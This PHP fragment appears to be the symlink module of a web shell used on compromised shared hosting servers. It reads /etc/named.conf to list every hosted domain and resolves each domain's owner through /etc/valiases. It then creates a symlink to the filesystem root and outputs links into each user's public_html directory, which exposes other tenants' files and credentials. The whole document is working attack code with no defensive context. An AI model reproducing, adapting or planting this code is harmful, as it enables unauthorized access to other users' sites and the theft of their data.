<?php 
  /*Symlink*/
        if ($_GET['aksi'] == 'symlink') {
            if (!is_file('named.txt')) {
                $d00m = @file("/etc/named.conf");
            } else {
                $d00m = @file("named.txt");
            }
            if (!$d00m) {
                echo "<center>
            <br/>
            <font color='red'>Gagal Membaca /etc/named.conf</font>
            <br/><br/></center>";
            } else {
                echo "<center>
        <div class='tmp'></center>
            <table align='center' width='100%'>
                <thead class='bg-info'>
                    <th>Domains</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
                foreach ($d00m as $dom) {
                    if (eregi("zone", $dom)) {
                        preg_match_all('#zone "(.*)"#', $dom, $domsws);
                        flush();
                        if (strlen(trim($domsws[1][0])) > 2) {
                            $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domsws[1][0]));
                            flush();
                            $site = $user['name'];
                            @symlink("/", "sym/root");
                            $site = $domsws[1][0];
                            $ir = 'ir';
                            $il = 'il';
                            if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
                                $site = ".$domsws[1][0].";
                            }
                            echo "
                            <tr>
                                <td>
                                    <a target='_blank' href=http://www." . $domsws[1][0] . "/>" . $site . " </a>
                                </td>
                                <td>
                                    " . $user['name'] . "
                                </td>
                                <td>
                                    <a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>Symlink</a>
                                </td>
                            </tr>";
                            flush();
                            flush();
                        }
                    }
                }
                echo "</table>
                </div><br><br>";
            }
        }

?>
